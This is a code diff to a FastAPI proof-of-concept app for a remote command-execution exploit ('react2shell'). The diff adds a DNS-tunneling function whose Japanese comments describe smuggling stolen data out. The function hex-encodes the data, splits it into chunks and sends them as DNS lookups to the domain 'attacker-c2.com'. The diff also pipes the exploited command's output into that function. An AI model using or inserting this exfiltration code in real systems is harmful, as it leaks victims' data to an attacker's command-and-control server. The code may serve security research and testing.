@@ -1,6 +1,7 @@
 from fastapi import FastAPI
 import requests
 import json
+import dns.resolver
 
 app = FastAPI(
     title="Brest Security API",
@@ -10,6 +11,39 @@ app = FastAPI(
 )
 
 app_base_path = "/poc"
+
+
+def dns_tunneling(original_data: str, c2_domain: str):
+    """
+    データを外部に盗み出すためにDNSを利用する手法を想定した関数です。
+    """
+    # 1. 盗んだデータを16進数（hex）に変換
+    data_hex = original_data.encode('utf-8').hex()
+
+    # 解決先（resolver）のカスタム設定
+    resolver = dns.resolver.Resolver(configure=False)
+    # dig @127.0.0.1 と同じことをするためにネームサーバーを指定
+    resolver.nameservers = ['127.0.0.1']
+    
+    # 2. 30文字ずつに分割してループ
+    chunk_size = 30
+    for i in range(0, len(data_hex), chunk_size):
+        chunk = data_hex[i : i + chunk_size]
+        sequence_number = i // chunk_size # 切り捨てて除算
+
+        # 3. 連結して完全な形のドメインを作成
+        # 例: 0.61646d...attacker-c2.com
+        target_fqdn = f"{sequence_number}.{chunk}.{c2_domain}"
+        print(f"Sending: {target_fqdn}")
+
+        try:
+            # 4. DNSルックアップを実行（Aレコードを引こうとする）
+            # 実際にはIPが返ってくる必要はなく、この「問い合わせ」がC2に届くことが目的
+            # 手早くデータを送るためタイムアウトは短くする。
+            resolver.resolve(target_fqdn, "A", lifetime=1)
+        except Exception:
+            # 応答がなくてもパケットは送信されているのでOK
+            pass
 
 
 @app.post(f"{app_base_path}/react2shell/command/", tags=["poc"], response_model=dict)
@@ -86,6 +120,9 @@ async def execute_command(body: dict):
     print(res.status_code)
     print(res.text)
 
+    dns_tunneling(res.text, "attacker-c2.com")
+
+    # 検証のために結果を返す。
     return {
         "result": res.text,
     }
